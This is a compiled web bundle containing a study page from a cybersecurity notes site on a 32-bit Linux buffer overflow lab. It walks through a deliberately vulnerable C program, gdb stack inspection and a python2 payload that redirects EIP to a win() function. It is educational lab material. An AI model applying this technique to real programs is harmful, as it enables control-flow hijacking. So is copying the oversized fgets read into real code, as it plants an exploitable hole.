"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[83846],{40889:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>d,default:()=>x,frontMatter:()=>r,metadata:()=>o,toc:()=>a});var i=t(74848),s=t(28453);const r={},d="Buffer Overflow Exploit without Shellcode (Redirection of EIP) in 32bit Executable",o={id:"cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_without_shellcode_32bit/README",title:"Buffer Overflow Exploit without Shellcode (Redirection of EIP) in 32bit Executable",description:"This example was supplied in https://samsclass.info/127/proj/ED202c.htm",source:"@site/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_without_shellcode_32bit/README.md",sourceDirName:"cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_without_shellcode_32bit",slug:"/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_without_shellcode_32bit/",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_without_shellcode_32bit/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"docsSidebar",previous:{title:"Linux Buffer Overflow with Listening Shell",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_with_listening_shell/"},next:{title:"Command Execution in Remote Server",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/cmd_execution_remote_server/"}},c={},a=[{value:"Compile Code",id:"compile-code",level:2},{value:"Overflow",id:"overflow",level:2},{value:"Seeing the Stack",id:"seeing-the-stack",level:2},{value:"Finding Return Address",id:"finding-return-address",level:2},{value:"Create Payload with EIP redirection",id:"create-payload-with-eip-redirection",level:2}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsxs)(n.h1,{id:"buffer-overflow-exploit-without-shellcode-redirection-of-eip-in-32bit-executable",children:["Buffer Overflow Exploit without Shellcode (Redirection of ",(0,i.jsx)(n.code,{children:"EIP"}),") in 32bit Executable"]})}),"\n",(0,i.jsxs)(n.p,{children:["This example was supplied in ",(0,i.jsx)(n.a,{href:"https://samsclass.info/127/proj/ED202c.htm",children:"https://samsclass.info/127/proj/ED202c.htm"})]}),"\n",(0,i.jsx)(n.h2,{id:"compile-code",children:"Compile Code"}),"\n",(0,i.jsxs)(n.p,{children:["I compiled the ",(0,i.jsx)(n.code,{children:"pwd.c"}),":"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",metastring:'title="pwd.c"',children:'\n#include <stdlib.h>\n#include <stdio.h>\n\nint test_pw() {\n        char password[10];\n        printf("Password address: %p\\n", password);\n        printf("Enter password: ");\n        fgets(password, 50, stdin);\n        return 1;\n}\n\nvoid win() {\n        printf("You win!\\n");\n}\n\nvoid main() {\n        if (test_pw()) printf("Fail!\\n");\n        else win();\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"using:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"cc \\\n    19          -mpreferred-stack-boundary=2 \\\n    20          -ggdb \\\n    21          -static \\\n    22          -m32 \\\n    23          -no-pie \\\n    24          -fno-stack-protector \\\n    25          -z execstack \\\n    26          -o /tmp/pwd pwd.c\n"})}),"\n",(0,i.jsx)(n.h2,{id:"overflow",children:"Overflow"}),"\n",(0,i.jsx)(n.p,{children:"Through trial and error, it was found that if we input more than 18 characters, the program crashes:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"python2 -c 'print(\"U\"*18)' | ./pwd\nPassword address: 0xffffccae\n[1]    103844 done                              python2 -c 'print(\"U\"*18)' | \n       103845 segmentation fault (core dumped)  ./pwd\n"})}),"\n",(0,i.jsx)(n.h2,{id:"seeing-the-stack",children:"Seeing the Stack"}),"\n",(0,i.jsxs)(n.p,{children:["Let's take a look at the stack right after the input. We open the program using ",(0,i.jsx)(n.code,{children:"gdb"})," and look at the instructions for the ",(0,i.jsx)(n.code,{children:"test_pw"})," function:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"> gdb -q /tmp/pwd\n\n(gdb) disas test_pw \nDump of assembler code for function test_pw:\n   0x08049da5 <+0>:     endbr32 \n   0x08049da9 <+4>:     push   %ebp\n   0x08049daa <+5>:     mov    %esp,%ebp\n   0x08049dac <+7>:     push   %ebx\n   0x08049dad <+8>:     sub    $0xc,%esp\n   0x08049db0 <+11>:    call   0x8049c80 <__x86.get_pc_thunk.bx>\n   0x08049db5 <+16>:    add    $0x9b24b,%ebx\n   0x08049dbb <+22>:    lea    -0xe(%ebp),%eax\n   0x08049dbe <+25>:    push   %eax\n   0x08049dbf <+26>:    lea    -0x30ff8(%ebx),%eax\n   0x08049dc5 <+32>:    push   %eax\n   0x08049dc6 <+33>:    call   0x8051230 <printf>\n   0x08049dcb <+38>:    add    $0x8,%esp\n   0x08049dce <+41>:    lea    -0x30fe2(%ebx),%eax\n   0x08049dd4 <+47>:    push   %eax\n   0x08049dd5 <+48>:    call   0x8051230 <printf>\n   0x08049dda <+53>:    add    $0x4,%esp\n   0x08049ddd <+56>:    mov    $0x80e5434,%eax\n   0x08049de3 <+62>:    mov    (%eax),%eax\n   0x08049de5 <+64>:    push   %eax\n   0x08049de6 <+65>:    push   $0x32\n   0x08049de8 <+67>:    lea    -0xe(%ebp),%eax\n   0x08049deb <+70>:    push   %eax\n   0x08049dec <+71>:    call   0x8058110 <fgets>\n   0x08049df1 <+76>:    add    $0xc,%esp\n   0x08049df4 <+79>:    mov    $0x1,%eax\n   0x08049df9 <+84>:    mov    -0x4(%ebp),%ebx\n   0x08049dfc <+87>:    leave  \n   0x08049dfd <+88>:    ret\n"})}),"\n",(0,i.jsxs)(n.p,{children:["We can see that the instruction right after getting the input from the user (",(0,i.jsx)(n.code,{children:"fgets"}),") is at byte 76. We put a breakpoint there so we can freeze the program and take a peak at the stack right after we supply the input."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"(gdb) b * test_pw +76\nBreakpoint 1 at 0x8049df1: file pwd.c, line 9.\n"})}),"\n",(0,i.jsxs)(n.p,{children:["Then we look at the two registers that define the range of the stack, ",(0,i.jsx)(n.code,{children:"ESP"})," (start of stack) and ",(0,i.jsx)(n.code,{children:"EBP"})," (end of stack)."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"(gdb) i r esp\nesp            0xffffcc60          0xffffcc60\n(gdb) i r ebp\nebp            0xffffcc7c          0xffffcc7c\n"})}),"\n",(0,i.jsxs)(n.p,{children:["We see that the stack is of size ",(0,i.jsx)(n.code,{children:"0x1C"})," (28 bytes in decimal). Let's a take a look at the next 10 wordsize hex addresses from ",(0,i.jsx)(n.code,{children:"ESP"}),":"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"(gdb) x/10x $esp\n0xffffcc60:     0xffffcc6e      0x00000032      0x080e5300      0x55550002\n0xffffcc70:     0x55555555      0x55555555      0x55555555      0x55555555\n0xffffcc80:     0x0804000a      0x080e5000\n"})}),"\n",(0,i.jsxs)(n.p,{children:["We can see that our input (",(0,i.jsx)(n.code,{children:"U"})," is ASCII is ",(0,i.jsx)(n.code,{children:"55"}),") overwrites every up until the ",(0,i.jsx)(n.code,{children:"EBP"}),". So the next 4 characters we supply should be the address where we want the instruction pointer to go. This is how we control the flow of the program."]}),"\n",(0,i.jsx)(n.h2,{id:"finding-return-address",children:"Finding Return Address"}),"\n",(0,i.jsxs)(n.p,{children:["We want to jump to the first instruction inside the ",(0,i.jsx)(n.code,{children:"win"})," function:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"(gdb) disas win \nDump of assembler code for function win:\n\n0x08049dfe <+0>:     endbr32 \n0x08049e02 <+4>:     push   %ebp\n0x08049e03 <+5>:     mov    %esp,%ebp\n0x08049e05 <+7>:     push   %ebx\n0x08049e06 <+8>:     call   0x8049e5f <__x86.get_pc_thunk.ax>\n0x08049e0b <+13>:    add    $0x9b1f5,%eax\n0x08049e10 <+18>:    lea    -0x30fd1(%eax),%edx\n0x08049e16 <+24>:    push   %edx\n0x08049e17 <+25>:    mov    %eax,%ebx\n0x08049e19 <+27>:    call   0x80586f0 <puts>\n0x08049e1e <+32>:    add    $0x4,%esp\n0x08049e21 <+35>:    nop\n0x08049e22 <+36>:    mov    -0x4(%ebp),%ebx\n0x08049e25 <+39>:    leave  \n0x08049e26 <+40>:    ret    \n"})}),"\n",(0,i.jsxs)(n.p,{children:["In this case, the address is ",(0,i.jsx)(n.code,{children:"0x08049dfe"}),". We need to convert this address to little Endian form so it will become ",(0,i.jsx)(n.code,{children:"\\xfe\\x9d\\x04\\x08"}),". We can use Python to create the payload for us."]}),"\n",(0,i.jsx)(n.h2,{id:"create-payload-with-eip-redirection",children:"Create Payload with EIP redirection"}),"\n",(0,i.jsxs)(n.p,{children:["We create the payload and pipe it into the program ",(0,i.jsx)(n.code,{children:"stdin"}),":"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"> python2 -c 'print(\"UUUUUUUUUUUUUUUUUU\\xfe\\x9d\\x04\\x08\")' | /tmp/pwd\n\nPassword address: 0xffffcdbe\nEnter password: You win!\n[1]    104775 done                              python2 -c 'print(\"UUUUUUUUUUUUUUUUUU\\xfe\\x9d\\x04\\x08\")' | \n       104776 segmentation fault (core dumped)  /tmp/pwd\n\n"})}),"\n",(0,i.jsxs)(n.p,{children:["Make sure to use ",(0,i.jsx)(n.code,{children:"python2"})," because ",(0,i.jsx)(n.code,{children:"python3"})," added extra bytes as padding when printing hexadecimal characters as described in ",(0,i.jsx)(n.a,{href:"https://bugs.python.org/issue34437",children:"this issue"}),"."]})]})}function x(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>d,x:()=>o});var i=t(96540);const s={},r=i.createContext(s);function d(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:d(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);